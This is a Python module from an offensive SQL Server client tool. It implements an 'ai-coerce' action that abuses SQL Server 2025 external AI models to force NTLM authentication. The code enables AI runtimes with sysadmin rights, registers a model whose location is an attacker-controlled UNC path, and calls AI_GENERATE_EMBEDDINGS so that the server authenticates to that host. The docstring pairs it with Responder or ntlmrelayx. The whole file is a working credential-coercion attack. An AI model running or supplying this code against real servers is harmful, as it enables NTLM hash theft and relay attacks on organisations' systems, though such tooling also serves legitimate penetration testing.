# mssqlclient_ng/core/actions/remote/ai_coerce.py

# Built-in imports
import uuid

# Third-party imports
from loguru import logger

# Local imports
from ..base import Arg, BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from .ai_models import requires_sql2025


@ActionFactory.register(
    "ai-coerce",
    "Force NTLM authentication to a UNC path by registering a throwaway EXTERNAL MODEL "
    "(SQL Server 2025) and invoking AI_GENERATE_EMBEDDINGS against it.",
    aliases=["model-coerce"],
)
class AiCoerce(BaseAction):
    """
    Force NTLM authentication to an attacker-controlled UNC path by registering
    a throwaway EXTERNAL MODEL that references a local ONNX runtime path, then
    invoking AI_GENERATE_EMBEDDINGS to trigger the file-system access.

    Prerequisites (all require sysadmin):
      sp_configure 'external AI runtimes enabled' = 1
      ALTER DATABASE SCOPED CONFIGURATION SET PREVIEW_FEATURES = ON

    The model is dropped after triggering unless --keep is passed.
    Pair with Responder or ntlmrelayx on the UNC listener.
    """

    _unc_path = Arg(position=0, short_name="u", long_name="unc", required=True,
                    description=r"Attacker-controlled UNC path, e.g. \\192.168.1.10\share")
    _model_name = Arg(short_name="n", long_name="name",
                      description="Model name to register (auto-generated if omitted)")
    _keep = Arg(long_name="keep", toggle=True, default=False,
                description="Keep the external model after triggering (default: drop it)")

    def validate_arguments(self, additional_arguments: str = "") -> None:
        self._bind_arguments(additional_arguments)

        path = self._unc_path.strip()
        if not path.startswith("\\\\"):
            path = "\\\\" + path.lstrip("\\")
        self._unc_path = path

        if not self._model_name:
            self._model_name = f"svc_emb_{uuid.uuid4().hex[:8]}"

    def execute(self, database_context: DatabaseContext) -> bool:
        if not requires_sql2025(database_context):
            return False

        logger.info(f"Triggering NTLM authentication to: {self._unc_path}")
        logger.info(f"Using model name: {self._model_name}")

        if not self._enable_prerequisites(database_context):
            return False
        if not self._create_external_model(database_context):
            return False

        self._trigger_authentication(database_context)

        if not self._keep:
            self._drop_model(database_context)
        return True

    @property
    def _model_identifier(self) -> str:
        return "[" + self._model_name.replace("]", "]]") + "]"

    def _enable_prerequisites(self, database_context: DatabaseContext) -> bool:
        if not database_context.config_service.set_configuration_option(
            "external AI runtimes enabled", 1
        ):
            logger.error("Failed to enable AI runtimes. Requires sysadmin.")
            return False

        try:
            # Required for CREATE EXTERNAL MODEL in the current database
            database_context.query_service.execute_non_processing(
                "ALTER DATABASE SCOPED CONFIGURATION SET PREVIEW_FEATURES = ON;",
                silent=True,
            )
            logger.debug("PREVIEW_FEATURES enabled for current database")
        except Exception as ex:
            # Non-fatal; some builds may not require it
            logger.warning(f"Could not enable PREVIEW_FEATURES: {ex}")

        return True

    def _create_external_model(self, database_context: DatabaseContext) -> bool:
        unc = self._unc_path.replace("'", "''")
        ddl = (
            f"CREATE EXTERNAL MODEL {self._model_identifier}\n"
            "WITH (\n"
            f"    LOCATION = '{unc}',\n"
            "    API_FORMAT = 'ONNX Runtime',\n"
            "    MODEL_TYPE = EMBEDDINGS,\n"
            "    MODEL = 'coerce',\n"
            f"    LOCAL_RUNTIME_PATH = '{unc}'\n"
            ");"
        )
        try:
            database_context.query_service.execute_non_processing(ddl, silent=True)
        except Exception as ex:
            logger.error(f"Failed to create external model: {ex}")
            return False

        logger.success(f"External model '{self._model_name}' created")
        return True

    def _trigger_authentication(self, database_context: DatabaseContext) -> None:
        # TRY/CATCH: the UNC host won't serve a valid model; the NTLM
        # handshake is what we're after, not an embedding result.
        query = (
            "BEGIN TRY\n"
            f"    SELECT AI_GENERATE_EMBEDDINGS(N'probe' USE MODEL {self._model_identifier});\n"
            "END TRY\n"
            "BEGIN CATCH\n"
            "END CATCH;\n"
            "SELECT 1 AS Triggered;"
        )
        try:
            database_context.query_service.execute_table(query)
            logger.success("Authentication attempt triggered, check your listener")
        except Exception as ex:
            logger.warning(
                f"Embedding call raised an exception (NTLM may still have been sent): {ex}"
            )

    def _drop_model(self, database_context: DatabaseContext) -> None:
        name = self._model_name.replace("'", "''")
        try:
            database_context.query_service.execute_non_processing(
                f"IF EXISTS (SELECT 1 FROM sys.external_models WHERE name = N'{name}') "
                f"DROP EXTERNAL MODEL {self._model_identifier};",
                silent=True,
            )
            logger.success(f"External model '{self._model_name}' removed")
        except Exception as ex:
            logger.warning(
                f"Cleanup failed, model '{self._model_name}' may still exist: {ex}"
            )
